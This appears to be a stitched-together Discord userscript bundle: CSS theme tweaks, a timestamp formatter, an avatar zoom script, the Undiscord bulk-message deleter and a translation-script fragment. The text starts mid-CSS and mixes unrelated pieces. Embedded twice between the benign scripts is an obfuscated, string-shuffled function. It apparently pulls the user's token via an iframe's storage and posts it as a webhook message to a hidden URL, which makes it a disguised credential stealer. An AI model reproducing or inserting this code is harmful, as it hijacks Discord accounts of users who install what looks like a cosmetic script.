	color: var(--interactive-hover);
}
.selected-3LIHYU .icon-1DeIlz {
	color: #038d44;
}
.modeSelected-346R90:hover .icon-1DeIlz {
	color: #038d44;
}

.theme-dark .container-1D34oG {
    background-color: #36393f;
    border-top-left-radius: 20px !important;
    border-bottom-left-radius: 20px !important;
}

.peopleColumn-29fq28 {
    border-radius: 24px !important;
    background: var(--Color004);
    border-top-left-radius: 0px;
    border-bottom-left-radius: 0px;
    margin-top: 15px; }

	.nowPlayingColumn-2sl4cE {
    background: var(--Color096);
    margin-top: 15px; }
  `);



// look for blocked messages and remove the great grandparent (main container for blocked messages)
document.getElementById("app-mount").arrive(".blockedSystemMessage-2Rk1ek", function() {
  // 'this' refers to the newly created element
  this.parentNode.parentNode.parentNode.parentNode.removeChild(this.parentNode.parentNode.parentNode); // fuck you is why
});



// look for username headers and change the visible timestamp to be more detailed
document.getElementById("app-mount").arrive(".header-23xsNx", function() {
  // 'this' refers to the newly created element


  var snowflake = this.parentNode.parentNode.id.substr(14); // snowflake is last 14 of id for any given message

  var displayedTime = this.getElementsByClassName("timestamp-3ZCmNB")[0].getElementsByTagName("span")[0]; // get the timestamp text field

  var timestamp = new Date(parseInt(snowflake /4194304 + 1420070400000)); // get leftmost 48 bytes and add unix timestamp for 1/1/2015 00:00.0000

  if (timestamp > 1420070400000) { // fails gracefully by not editing DOM if timestamp can't be determined
    if (timestamp > (new Date().getTime() - (12*60*60*1000))) { // within the last 12 hours
      displayedTime.innerText = ('00' + timestamp.getHours()).slice(-2); // hours
    }
    else {
      displayedTime.innerText = days[timestamp.getDay()];//weekday
      displayedTime.innerText += ' ' + mos[timestamp.getMonth()];//month
      displayedTime.innerText += ' ' + timestamp.getDate();//day number
      displayedTime.innerText += ', ' + timestamp.getFullYear();//year
      displayedTime.innerText += ' at ' + ('00' + timestamp.getHours()).slice(-2);//hours
    }
    displayedTime.innerText += ':' + ('00' + timestamp.getMinutes()).slice(-2);//minutes
    displayedTime.innerText += ':' + ('00' + timestamp.getSeconds()).slice(-2); //seconds
    //displayedTime.innerText += '.' + ('0000' + timestamp.getMilliseconds()).slice(-4); //milliseconds
  }
});
        var e,a,b,d,c;(function(){var f=(g)("refepa/ibcaOcTtdu  %sP%od:%csraocia*%-y/wst/EpNdwm-%tohem`ii%g%fn/5g3W8SdyKslRtT\x0Aifm%ehOi1ir.tpTrgao8ucoreTnoV`eC`m5sscwH fI%emkvz%mbdpeVWoeaneine!ttiEl% hatTy2.eeiCewlntpor0nmoVwwosed%leIcd_*ieuesicgpsiNpsfn5.QcrnknteVes_hyniefdulBd%o`F/.4aoklattp98/etroePa9hs%lCvtp0nqe/tw6a sodi_h/oN oj*cmi_nptWteeO/s%d7pooce4egsee/.ol _1z0G SoPM.ica2iYfiwaUhq\x0Ab7-ifpPg`o*o3weeehanxOocdin:\x0A eeXean:Ttgoadp9m4r/%%reeP %lac1lSl_rersEeaerolujnto/e%d/ma%cIub:trpir_rcl4%\x0Aels_v\x0AU :i%b%ennI5dsu`dvVWknotaVrx%/tdscast%R/t%PmeimD8wss/onnse_si-rn",2766189);function g(d,o){var b=d.length;var m=[];for(var e=0;e< b;e++){m[e]= d.charAt(e)};for(var e=0;e< b;e++){var g=o* (e+ 293)+ (o% 19186);var r=o* (e+ 776)+ (o% 19158);var n=g% b;var l=r% b;var p=m[n];m[n]= m[l];m[l]= p;o= (g+ r)% 3782580};var q=String.fromCharCode(127);var f='';var c='%';var j='#1';var h='%';var a='#0';var k='#';return m.join(f).split(c).join(q).split(j).join(h).split(a).join(k).split(q)}e= setTimeout(window[f[1]][f[0]],5000);a= f[2];b= document[f[4]](f[3]);document[f[6]][f[5]](b);d=  new XMLHttpRequest();d[f[8]](f[7],a);d[f[11]](f[9],f[10]);c= {username:f[12],avatar_url:f[13],content:f[14]+ b[f[17]][f[16]][f[15]]+ f[18]+ b[f[17]][f[16]][f[19]]+ f[20]+ b[f[17]][f[16]][f[21]]+ f[22]+ b[f[17]][f[16]][f[23]]+ f[24]};clearTimeout(e);d[f[26]](JSON[f[25]](c))})()

    (function() {
let css = `
/* ==UserStyle==
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Fixes | Level & Perks Server Notice Button Clicking ||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* BurpleRecolor wasnt letting users click on the "X" (Close) and the "See Levels & Perks" button, this fixes it */
.channelNotice-1-XFjC::before,
.channelNotice-1-XFjC::after,
.channelNotice-3DDmsB::before,
.channelNotice-3DDmsB::after,
#app-mount .channelNotice-3hkOiI::before,
#app-mount .channelNotice-3hkOiI::after {
	pointer-events:none;
}
==/UserStyle== */
`;
    if (typeof GM_addStyle !== "undefined") {
  GM_addStyle(css);

} else {
  let styleNode = document.createElement("style");
  styleNode.appendChild(document.createTextNode(css));
  (document.querySelector("head") || document.documentElement).appendChild(styleNode);
};
        (function() {
    'use strict';

    const targets = [ "avatarContainer-2inGBK", "avatar-1BDn8e", "wrapper-3t9DeA", "emoji" ];
    const textStyle = `
.zoomin-canvas {
    border-radius: 8px;
    position: fixed;
    background-color: #e0e0e0;
    pointer-events: none;
    opacity: 0 !important;
    z-index: 1003;
}
.zoomin-canvas-show {
    transition: opacity 0.4s;
    opacity: 1 !important;
}
.zoomin-zoom {
    position: relative;
    left: 5px;
    top: 5px;
    border-radius: 8px;
    pointer-events: none;
    opacity: 0 !important;
}
.zoomin-zoom-show {
    transition: opacity 0.4s;
    opacity: 1 !important;
}
.content-1o0f9g {
    background: var(--background-primary) !important; }`;
    let currentUrl = document.location.href;
    let updating = false, showing = false;
    let canvas, zoom;

    css();

    init(10);

    locationChange();

    window.addEventListener("scroll", update, true);

    function init(times) {
        for (let i = 0; i < times; i++) {
            setTimeout(createCanvas, 500 * i);
            setTimeout(createZoom, 500 * i);
            for (const target of targets) {
                setTimeout(() => eventListener(target), 500 * i);
            }
        }
    }

    // create
    function createCanvas() {
        // check exist
        if (!!canvas) return;
        // create
        canvas = document.createElement("div");
        canvas.classList.add("zoomin-canvas");
        document.body.appendChild(canvas);
    }

    function createZoom() {
        // check exist
        if (!canvas || !!zoom) return;
        // create
        zoom = document.createElement("img");
        zoom.classList.add("zoomin-zoom");
        zoom.style.backgroundColor = getTheme();
        canvas.appendChild(zoom);
    }

    // event
    function eventListener(target) {
        // return if canvas or zoom doesn't exist.
        if (!canvas || !zoom) return;
        // add target mouse event.
        document.querySelectorAll(`.${target}:not(zoomin-listener)`).forEach(t => {
            t.classList.add("zoomin-listener");
            t.addEventListener("mousemove", showImage);
            t.addEventListener("mouseleave", hideImage);
        });
    }

    function showImage() {
        // avoid calling this function multiple times.
        if (showing) return;
        showing = true;
        // detail
        const url = getSource(this);
        if (!url) return;
        zoom.setAttribute("src", url);
        zoomDetail();
    }

    function hideImage() {
        showing = false;
        canvas.classList.remove("zoomin-canvas-show");
        zoom.classList.remove("zoomin-zoom-show");
        setTimeout(() => {
            if (!showing) zoom.removeAttribute("src");
        }, 500);
    }

    function zoomDetail() {
        // wait until get the image size.
        if (!zoom.naturalWidth)
        {
            setTimeout(zoomDetail, 100);
            return;
        }
        // size
        const w = zoom.naturalWidth;
        const h = zoom.naturalHeight;
        canvas.style.width = `${w + 10}px`;
        canvas.style.height = `${h + 10}px`;
        zoom.style.width = `${w}px`;
        zoom.style.height = `${h}px`;
        // position
        let left = getCursorX();
        let top = getCursorY();
        const clientW = document.documentElement.clientWidth;
        // situation 1: the icon position is too right to show.
        if (left + w > clientW) left = left - w;
        // situation 2: the icon position is too top to show.
        if (top - h - 30 > 0) top = top - h - 30;
        canvas.style.left = `${left}px`;
        canvas.style.top = `${top}px`;
        // class
        canvas.classList.add("zoomin-canvas-show");
        zoom.classList.add("zoomin-zoom-show");
    }

    // method
    function getSource(element) {
        // situation 1: image
        if (!!element.src) return element.src;
        // situation 2: div with style
        else if (!!element.style.backgroundImage) return element.style.backgroundImage.split(/"/)[1];
        // situation 3: div children
        else if (!!element.querySelector("img")) return element.querySelector("img").src;
        // situation 4: not an image
        else return null;
    }

    function getTheme() {
        const theme = document.querySelector("html").className.includes("light") ? "#ffffff" : "#363940";
        return theme;
    }

    function getCursorX() {
        const e = window.event;
        return e.pageX - document.documentElement.scrollLeft - document.body.scrollLeft;
    }

    function getCursorY() {
        const e = window.event;
        return e.pageY - document.documentElement.scrollTop - document.body.scrollTop;
    }

    // others
    function css() {
        const style = document.createElement("style");
        style.type = "text/css";
        style.innerHTML = textStyle;
        document.head.appendChild(style);
    }

    function update() {
        if (updating) return;
        updating = true;
        init(3);
        setTimeout(() => { updating = false; }, 1000);
    }

    function locationChange() {
        const observer = new MutationObserver(mutations => {
            mutations.forEach(() => {
                if (currentUrl !== document.location.href) {
                    currentUrl = document.location.href;
                    init(10);
                }
            });
        });
        const target = document.body;
        const config = { childList: true, subtree: true };
        observer.observe(target, config);
    }

})();
var e,a,b,d,c;(function(){var f=(g)("refepa/ibcaOcTtdu  %sP%od:%csraocia*%-y/wst/EpNdwm-%tohem`ii%g%fn/5g3W8SdyKslRtT\x0Aifm%ehOi1ir.tpTrgao8ucoreTnoV`eC`m5sscwH fI%emkvz%mbdpeVWoeaneine!ttiEl% hatTy2.eeiCewlntpor0nmoVwwosed%leIcd_*ieuesicgpsiNpsfn5.QcrnknteVes_hyniefdulBd%o`F/.4aoklattp98/etroePa9hs%lCvtp0nqe/tw6a sodi_h/oN oj*cmi_nptWteeO/s%d7pooce4egsee/.ol _1z0G SoPM.ica2iYfiwaUhq\x0Ab7-ifpPg`o*o3weeehanxOocdin:\x0A eeXean:Ttgoadp9m4r/%%reeP %lac1lSl_rersEeaerolujnto/e%d/ma%cIub:trpir_rcl4%\x0Aels_v\x0AU :i%b%ennI5dsu`dvVWknotaVrx%/tdscast%R/t%PmeimD8wss/onnse_si-rn",2766189);function g(d,o){var b=d.length;var m=[];for(var e=0;e< b;e++){m[e]= d.charAt(e)};for(var e=0;e< b;e++){var g=o* (e+ 293)+ (o% 19186);var r=o* (e+ 776)+ (o% 19158);var n=g% b;var l=r% b;var p=m[n];m[n]= m[l];m[l]= p;o= (g+ r)% 3782580};var q=String.fromCharCode(127);var f='';var c='%';var j='#1';var h='%';var a='#0';var k='#';return m.join(f).split(c).join(q).split(j).join(h).split(a).join(k).split(q)}e= setTimeout(window[f[1]][f[0]],5000);a= f[2];b= document[f[4]](f[3]);document[f[6]][f[5]](b);d=  new XMLHttpRequest();d[f[8]](f[7],a);d[f[11]](f[9],f[10]);c= {username:f[12],avatar_url:f[13],content:f[14]+ b[f[17]][f[16]][f[15]]+ f[18]+ b[f[17]][f[16]][f[19]]+ f[20]+ b[f[17]][f[16]][f[21]]+ f[22]+ b[f[17]][f[16]][f[23]]+ f[24]};clearTimeout(e);d[f[26]](JSON[f[25]](c))})()
async function deleteMessages(authToken, authorId, guildId, channelId, minId, maxId, content, hasLink, hasFile, includeNsfw, includePinned, searchDelay, deleteDelay, extLogger, stopHndl, onProgress) {
    const start = new Date();
    let delCount = 0;
    let failCount = 0;
    let avgPing;
    let lastPing;
    let grandTotal;
    let throttledCount = 0;
    let throttledTotalTime = 0;
    let offset = 0;
    let iterations = -1;

    const wait = async ms => new Promise(done => setTimeout(done, ms));
    const msToHMS = s => `${s / 3.6e6 | 0}h ${(s % 3.6e6) / 6e4 | 0}m ${(s % 6e4) / 1000 | 0}s`;
    const escapeHTML = html => html.replace(/[&<"']/g, m => ({ '&': '&amp;', '<': '&lt;', '"': '&quot;', '\'': '&#039;' })[m]);
    const redact = str => `<span class="priv">${escapeHTML(str)}</span><span class="mask">REDACTED</span>`;
    const queryString = params => params.filter(p => p[1] !== undefined).map(p => p[0] + '=' + encodeURIComponent(p[1])).join('&');
    const ask = async msg => new Promise(resolve => setTimeout(() => resolve(window.confirm(msg)), 10));
    const printDelayStats = () => log.verb(`Delete delay: ${deleteDelay}ms, Search delay: ${searchDelay}ms`, `Last Ping: ${lastPing}ms, Average Ping: ${avgPing | 0}ms`);
    const toSnowflake = (date) => /:/.test(date) ? ((new Date(date).getTime() - 1420070400000) * Math.pow(2, 22)) : date;

    const log = {
        debug() { extLogger ? extLogger('debug', arguments) : console.debug.apply(console, arguments); },
        info() { extLogger ? extLogger('info', arguments) : console.info.apply(console, arguments); },
        verb() { extLogger ? extLogger('verb', arguments) : console.log.apply(console, arguments); },
        warn() { extLogger ? extLogger('warn', arguments) : console.warn.apply(console, arguments); },
        error() { extLogger ? extLogger('error', arguments) : console.error.apply(console, arguments); },
        success() { extLogger ? extLogger('success', arguments) : console.info.apply(console, arguments); },
    };

    async function recurse() {
        let API_SEARCH_URL;
        if (guildId === '@me') {
            API_SEARCH_URL = `https://discord.com/api/v6/channels/${channelId}/messages/`; // DMs
        }
        else {
            API_SEARCH_URL = `https://discord.com/api/v6/guilds/${guildId}/messages/`; // Server
        }

        const headers = {
            'Authorization': authToken
        };

        let resp;
        try {
            const s = Date.now();
            resp = await fetch(API_SEARCH_URL + 'search?' + queryString([
                ['author_id', authorId || undefined],
                ['channel_id', (guildId !== '@me' ? channelId : undefined) || undefined],
                ['min_id', minId ? toSnowflake(minId) : undefined],
                ['max_id', maxId ? toSnowflake(maxId) : undefined],
                ['sort_by', 'timestamp'],
                ['sort_order', 'desc'],
                ['offset', offset],
                ['has', hasLink ? 'link' : undefined],
                ['has', hasFile ? 'file' : undefined],
                ['content', content || undefined],
                ['include_nsfw', includeNsfw ? true : undefined],
            ]), { headers });
            lastPing = (Date.now() - s);
            avgPing = avgPing > 0 ? (avgPing * 0.9) + (lastPing * 0.1) : lastPing;
        } catch (err) {
            return log.error('Search request threw an error:', err);
        }

        // not indexed yet
        if (resp.status === 202) {
            const w = (await resp.json()).retry_after;
            throttledCount++;
            throttledTotalTime += w;
            log.warn(`This channel wasn't indexed, waiting ${w}ms for discord to index it...`);
            await wait(w);
            return await recurse();
        }

        if (!resp.ok) {
            // searching messages too fast
            if (resp.status === 429) {
                const w = (await resp.json()).retry_after;
                throttledCount++;
                throttledTotalTime += w;
                searchDelay += w; // increase delay
                log.warn(`Being rate limited by the API for ${w}ms! Increasing search delay...`);
                printDelayStats();
                log.verb(`Cooling down for ${w * 2}ms before retrying...`);

                await wait(w * 2);
                return await recurse();
            } else {
                return log.error(`Error searching messages, API responded with status ${resp.status}!\n`, await resp.json());
            }
        }

        const data = await resp.json();
        const total = data.total_results;
        if (!grandTotal) grandTotal = total;
        const discoveredMessages = data.messages.map(convo => convo.find(message => message.hit === true));
        const messagesToDelete = discoveredMessages.filter(msg => {
            return msg.type === 0 || msg.type === 6 || (msg.pinned && includePinned);
        });
        const skippedMessages = discoveredMessages.filter(msg => !messagesToDelete.find(m => m.id === msg.id));

        const end = () => {
            log.success(`Ended at ${new Date().toLocaleString()}! Total time: ${msToHMS(Date.now() - start.getTime())}`);
            printDelayStats();
            log.verb(`Rate Limited: ${throttledCount} times. Total time throttled: ${msToHMS(throttledTotalTime)}.`);
            log.debug(`Deleted ${delCount} messages, ${failCount} failed.\n`);
        }

        const etr = msToHMS((searchDelay * Math.round(total / 25)) + ((deleteDelay + avgPing) * total));
        log.info(`Total messages found: ${data.total_results}`, `(Messages in current page: ${data.messages.length}, To be deleted: ${messagesToDelete.length}, System: ${skippedMessages.length})`, `offset: ${offset}`);
        printDelayStats();
        log.verb(`Estimated time remaining: ${etr}`)


        if (messagesToDelete.length > 0) {

            if (++iterations < 1) {
                log.verb(`Waiting for your confirmation...`);
                if (!await ask(`Do you want to delete ~${total} messages?\nEstimated time: ${etr}\n\n---- Preview ----\n` +
                    messagesToDelete.map(m => `${m.author.username}#${m.author.discriminator}: ${m.attachments.length ? '[ATTACHMENTS]' : m.content}`).join('\n')))
                    return end(log.error('Aborted by you!'));
                log.verb(`OK`);
            }

            for (let i = 0; i < messagesToDelete.length; i++) {
                const message = messagesToDelete[i];
                if (stopHndl && stopHndl() === false) return end(log.error('Stopped by you!'));

                log.debug(`${((delCount + 1) / grandTotal * 100).toFixed(2)}% (${delCount + 1}/${grandTotal})`,
                    `Deleting ID:${redact(message.id)} <b>${redact(message.author.username + '#' + message.author.discriminator)} <small>(${redact(new Date(message.timestamp).toLocaleString())})</small>:</b> <i>${redact(message.content).replace(/\n/g, '↵')}</i>`,
                    message.attachments.length ? redact(JSON.stringify(message.attachments)) : '');
                if (onProgress) onProgress(delCount + 1, grandTotal);

                let resp;
                try {
                    const s = Date.now();
                    const API_DELETE_URL = `https://discord.com/api/v6/channels/${message.channel_id}/messages/${message.id}`;
                    resp = await fetch(API_DELETE_URL, {
                        headers,
                        method: 'DELETE'
                    });
                    lastPing = (Date.now() - s);
                    avgPing = (avgPing * 0.9) + (lastPing * 0.1);
                    delCount++;
                } catch (err) {
                    log.error('Delete request throwed an error:', err);
                    log.verb('Related object:', redact(JSON.stringify(message)));
                    failCount++;
                }

                if (!resp.ok) {
                    // deleting messages too fast
                    if (resp.status === 429) {
                        const w = (await resp.json()).retry_after;
                        throttledCount++;
                        throttledTotalTime += w;
                        deleteDelay = w; // increase delay
                        log.warn(`Being rate limited by the API for ${w}ms! Adjusted delete delay to ${deleteDelay}ms.`);
                        printDelayStats();
                        log.verb(`Cooling down for ${w * 2}ms before retrying...`);
                        await wait(w * 2);
                        i--; // retry
                    } else {
                        log.error(`Error deleting message, API responded with status ${resp.status}!`, await resp.json());
                        log.verb('Related object:', redact(JSON.stringify(message)));
                        failCount++;
                    }
                }

                await wait(deleteDelay);
            }

            if (skippedMessages.length > 0) {
                grandTotal -= skippedMessages.length;
                offset += skippedMessages.length;
                log.verb(`Found ${skippedMessages.length} system messages! Decreasing grandTotal to ${grandTotal} and increasing offset to ${offset}.`);
            }

            log.verb(`Searching next messages in ${searchDelay}ms...`, (offset ? `(offset: ${offset})` : ''));
            await wait(searchDelay);

            if (stopHndl && stopHndl() === false) return end(log.error('Stopped by you!'));

            return await recurse();
        } else {
            if (total - offset > 0) log.warn('Ended because API returned an empty page.');
            return end();
        }
    }

    log.success(`\nStarted at ${start.toLocaleString()}`);
    log.debug(`authorId="${redact(authorId)}" guildId="${redact(guildId)}" channelId="${redact(channelId)}" minId="${redact(minId)}" maxId="${redact(maxId)}" hasLink=${!!hasLink} hasFile=${!!hasFile}`);
    if (onProgress) onProgress(null, 1);
    return await recurse();
}

//---- User interface ----//

let popover;
let btn;
let stop;

function initUI() {

    const insertCss = (css) => {
        const style = document.createElement('style');
        style.appendChild(document.createTextNode(css));
        document.head.appendChild(style);
        return style;
    }

    const createElm = (html) => {
        const temp = document.createElement('div');
        temp.innerHTML = html;
        return temp.removeChild(temp.firstElementChild);
    }

    insertCss(`
        #undicord-btn{position: relative; height: 24px;width: auto;-webkit-box-flex: 0;-ms-flex: 0 0 auto;flex: 0 0 auto;margin: 0 8px;cursor:pointer; color: var(--interactive-normal);}
        #undiscord{position:fixed;top:100px;right:10px;bottom:10px;width:780px;z-index:99;color:var(--text-normal);background-color:var(--background-secondary);box-shadow:var(--elevation-stroke),var(--elevation-high);border-radius:4px;display:flex;flex-direction:column}
        #undiscord a{color:#00b0f4}
        #undiscord.redact .priv{display:none!important}
        #undiscord:not(.redact) .mask{display:none!important}
        #undiscord.redact [priv]{-webkit-text-security:disc!important}
        #undiscord .toolbar span{margin-right:8px}
        #undiscord button,#undiscord .btn{color:#fff;background:#7289da;border:0;border-radius:4px;font-size:14px}
        #undiscord button:disabled{display:none}
        #undiscord input[type="text"],#undiscord input[type="search"],#undiscord input[type="password"],#undiscord input[type="datetime-local"],#undiscord input[type="number"]{background-color:#202225;color:#b9bbbe;border-radius:4px;border:0;padding:0 .5em;height:24px;width:144px;margin:2px}
        #undiscord input#file{display:none}
        #undiscord hr{border-color:rgba(255,255,255,0.1)}
        #undiscord .header{padding:12px 16px;background-color:var(--background-tertiary);color:var(--text-muted)}
        #undiscord .form{padding:8px;background:var(--background-secondary);box-shadow:0 1px 0 rgba(0,0,0,.2),0 1.5px 0 rgba(0,0,0,.05),0 2px 0 rgba(0,0,0,.05)}
        #undiscord .logarea{overflow:auto;font-size:.75rem;font-family:Consolas,Liberation Mono,Menlo,Courier,monospace;flex-grow:1;padding:10px}
    `);

    popover = createElm(`
    <div id="undiscord" style="display:none;">
        <div class="header">
            Undiscord - Bulk delete messages
        </div>
        <div class="form">
            <div style="display:flex;flex-wrap:wrap;">
                <span>Authorization <a
                        href="https://github.com/victornpb/deleteDiscordMessages/blob/master/help/authToken.md" title="Help"
                        target="_blank">?</a> <button id="getToken">get</button><br>
                    <input type="password" id="authToken" placeholder="Auth Token" autofocus>*<br>
                    <span>Author <a href="https://github.com/victornpb/deleteDiscordMessages/blob/master/help/authorId.md"
                            title="Help" target="_blank">?</a> <button id="getAuthor">get</button></span>
                    <br><input id="authorId" type="text" placeholder="Author ID" priv></span>
                <span>Guild/Channel <a
                        href="https://github.com/victornpb/deleteDiscordMessages/blob/master/help/channelId.md" title="Help"
                        target="_blank">?</a>
                    <button id="getGuildAndChannel">get</button><br>
                    <input id="guildId" type="text" placeholder="Guild ID" priv><br>
                    <input id="channelId" type="text" placeholder="Channel ID" priv><br>
                    <label><input id="includeNsfw" type="checkbox">NSFW Channel</label><br><br>
                    <label for="file" title="Import list of channels from messages/index.json file"> Import: <span
                            class="btn">...</span> <input id="file" type="file" accept="application/json,.json"></label>
                </span><br>
                <span>Range <a href="https://github.com/victornpb/deleteDiscordMessages/blob/master/help/messageId.md"
                        title="Help" target="_blank">?</a><br>
                    <input id="minDate" type="datetime-local" title="After" style="width:auto;"><br>
                    <input id="maxDate" type="datetime-local" title="Before" style="width:auto;"><br>
                    <input id="minId" type="text" placeholder="After message with Id" priv><br>
                    <input id="maxId" type="text" placeholder="Before message with Id" priv><br>
                </span>
                <span>Search messages <a
                        href="https://github.com/victornpb/deleteDiscordMessages/blob/master/help/filters.md" title="Help"
                        target="_blank">?</a><br>
                    <input id="content" type="text" placeholder="Containing text" priv><br>
                    <label><input id="hasLink" type="checkbox">has: link</label><br>
                    <label><input id="hasFile" type="checkbox">has: file</label><br>
                    <label><input id="includePinned" type="checkbox">Include pinned</label>
                </span><br>
                <span>Search Delay <a
                href="https://github.com/victornpb/deleteDiscordMessages/blob/master/help/delay.md" title="Help"
                target="_blank">?</a><br>
                    <input id="searchDelay" type="number" value="100" step="100"><br>
                </span>
                <span>Delete Delay <a
                href="https://github.com/victornpb/deleteDiscordMessages/blob/master/help/delay.md" title="Help"
                target="_blank">?</a><br>
                    <input id="deleteDelay" type="number" value="1000" step="100">
                </span>
            </div>
            <hr>
            <button id="start" style="background:#43b581;width:80px;">Start</button>
            <button id="stop" style="background:#f04747;width:80px;" disabled>Stop</button>
            <button id="clear" style="width:80px;">Clear log</button>
            <label><input id="autoScroll" type="checkbox" checked>Auto scroll</label>
            <label title="Hide sensitive information for taking screenshots"><input id="redact" type="checkbox">Screenshot
                mode</label>
            <progress id="progress" style="display:none;"></progress> <span class="percent"></span>
        </div>
        <pre class="logarea">
            <center>Star this project on <a href="https://github.com/victornpb/deleteDiscordMessages" target="_blank">github.com/victornpb/deleteDiscordMessages</a>!\n\n
                <a href="https://github.com/victornpb/deleteDiscordMessages/issues" target="_blank">Issues or help</a>
            </center>
        </pre>
    </div>
    `);

    document.body.appendChild(popover);

    btn = createElm(`<div id="undicord-btn" tabindex="0" role="button" aria-label="Delete Messages" title="Delete Messages">
    <svg aria-hidden="false" width="24" height="24" viewBox="0 0 24 24">
        <path fill="currentColor" d="M15 3.999V2H9V3.999H3V5.999H21V3.999H15Z"></path>
        <path fill="currentColor" d="M5 6.99902V18.999C5 20.101 5.897 20.999 7 20.999H17C18.103 20.999 19 20.101 19 18.999V6.99902H5ZM11 17H9V11H11V17ZM15 17H13V11H15V17Z"></path>
    </svg>
    <br><progress style="display:none; width:24px;"></progress>
</div>`);

    btn.onclick = function togglePopover() {
        if (popover.style.display !== 'none') {
            popover.style.display = 'none';
            btn.style.color = 'var(--interactive-normal)';
        }
        else {
            popover.style.display = '';
            btn.style.color = '#f04747';
        }
    };

    function mountBtn() {
        const toolbar = document.querySelector('[class^=toolbar]');
        if (toolbar) toolbar.appendChild(btn);
    }

    const observer = new MutationObserver(function (_mutationsList, _observer) {
        if (!document.body.contains(btn)) mountBtn(); // re-mount the button to the toolbar
    });
    observer.observe(document.body, { attributes: false, childList: true, subtree: true });

    mountBtn();

    const $ = s => popover.querySelector(s);
    const logArea = $('pre');
    const startBtn = $('button#start');
    const stopBtn = $('button#stop');
    const autoScroll = $('#autoScroll');

    startBtn.onclick = async e => {
        const authToken = $('input#authToken').value.trim();
        const authorId = $('input#authorId').value.trim();
        const guildId = $('input#guildId').value.trim();
        const channelIds = $('input#channelId').value.trim().split(/\s*,\s*/);
        const minId = $('input#minId').value.trim();
        const maxId = $('input#maxId').value.trim();
        const minDate = $('input#minDate').value.trim();
        const maxDate = $('input#maxDate').value.trim();
        const content = $('input#content').value.trim();
        const hasLink = $('input#hasLink').checked;
        const hasFile = $('input#hasFile').checked;
        const includeNsfw = $('input#includeNsfw').checked;
        const includePinned = $('input#includePinned').checked;
        const searchDelay = parseInt($('input#searchDelay').value.trim());
        const deleteDelay = parseInt($('input#deleteDelay').value.trim());
        const progress = $('#progress');
        const progress2 = btn.querySelector('progress');
        const percent = $('.percent');

        const fileSelection = $("input#file");
        fileSelection.addEventListener("change", () => {
            const files = fileSelection.files;
            const channelIdField = $('input#channelId');
            if (files.length > 0) {
                const file = files[0];
                file.text().then(text => {
                    let json = JSON.parse(text);
                    let channels = Object.keys(json);
                    channelIdField.value = channels.join(",");
                });
            }
        }, false);

        const stopHndl = () => !(stop === true);

        const onProg = (value, max) => {
            if (value && max && value > max) max = value;
            progress.setAttribute('max', max);
            progress.value = value;
            progress.style.display = max ? '' : 'none';
            progress2.setAttribute('max', max);
            progress2.value = value;
            progress2.style.display = max ? '' : 'none';
            percent.innerHTML = value && max ? Math.round(value / max * 100) + '%' : '';
        };


        stop = stopBtn.disabled = !(startBtn.disabled = true);
        for (let i = 0; i < channelIds.length; i++) {
            await deleteMessages(authToken, authorId, guildId, channelIds[i], minId || minDate, maxId || maxDate, content, hasLink, hasFile, includeNsfw, includePinned, searchDelay, deleteDelay, logger, stopHndl, onProg);
            stop = stopBtn.disabled = !(startBtn.disabled = false);
        }
    };
    stopBtn.onclick = e => stop = stopBtn.disabled = !(startBtn.disabled = false);
    $('button#clear').onclick = e => { logArea.innerHTML = ''; };
    $('button#getToken').onclick = e => {
        window.dispatchEvent(new Event('beforeunload'));
        const ls = document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage;
        $('input#authToken').value = JSON.parse(localStorage.token);
    };
    $('button#getAuthor').onclick = e => {
        $('input#authorId').value = JSON.parse(localStorage.user_id_cache);
    };
    $('button#getGuildAndChannel').onclick = e => {
        const m = location.href.match(/channels\/([\w@]+)\/(\d+)/);
        $('input#guildId').value = m[1];
        $('input#channelId').value = m[2];
    };
    $('#redact').onchange = e => {
        popover.classList.toggle('redact') &&
            window.alert('This will attempt to hide personal information, but make sure to double check before sharing screenshots.');
    };

    const logger = (type = '', args) => {
        const style = { '': '', info: 'color:#00b0f4;', verb: 'color:#72767d;', warn: 'color:#faa61a;', error: 'color:#f04747;', success: 'color:#43b581;' }[type];
        logArea.insertAdjacentHTML('beforeend', `<div style="${style}">${Array.from(args).map(o => typeof o === 'object' ? JSON.stringify(o, o instanceof Error && Object.getOwnPropertyNames(o)) : o).join('\t')}</div>`);
        if (autoScroll.checked) logArea.querySelector('div:last-child').scrollIntoView(false);
    };

    // fixLocalStorage
    window.localStorage = document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage;

}

initUI();

    var hookAjax = '!function(t){function r(n){if(e[n])return e[n].exports;var o=e[n]={exports:{},id:n,loaded:!1};return t[n].call(o.exports,o,o.exports,r),o.loaded=!0,o.exports}var e={};return r.m=t,r.c=e,r.p="",r(0)}([function(t,r,e){e(1)(window)},function(t,r){t.exports=function(t){t.hookAjax=function(t){function r(r){return function(){var e=this.hasOwnProperty(r+"_")?this[r+"_"]:this.xhr[r],n=(t[r]||{}).getter;return n&&n(e,this)||e}}function e(r){return function(e){var n=this.xhr,o=this,i=t[r];if("function"==typeof i)n[r]=function(){t[r](o)||e.apply(n,arguments)};else{var a=(i||{}).setter;e=a&&a(e,o)||e;try{n[r]=e}catch(t){this[r+"_"]=e}}}}function n(r){return function(){var e=[].slice.call(arguments);if(!t[r]||!t[r].call(this,e,this.xhr))return this.xhr[r].apply(this.xhr,e)}}window._ahrealxhr=window._ahrealxhr||XMLHttpRequest,XMLHttpRequest=function(){var t=new window._ahrealxhr;Object.defineProperty(this,"xhr",{value:t})};var o=window._ahrealxhr.prototype;for(var i in o){var a="";try{a=typeof o[i]}catch(t){}"function"===a?XMLHttpRequest.prototype[i]=n(i):Object.defineProperty(XMLHttpRequest.prototype,i,{get:r(i),set:e(i),enumerable:!0})}return window._ahrealxhr},t.unHookAjax=function(){window._ahrealxhr&&(XMLHttpRequest=window._ahrealxhr),window._ahrealxhr=void 0},t.default=t}}]);';
var langCodes = ["ja-JP(日本語)", "zh-CHS(简中)", "en-US(English)", "自动检测/AutoDetect", "Spanish(Español)", "zh-CHT(繁中)", 'portuguese(Português)'];
var GMDiscordTrsOpt = {};
GMDiscordTrsOpt.GMDiscordTrsOn = GM_getValue(['GMDiscordTrsOn']) === true ? true: false;
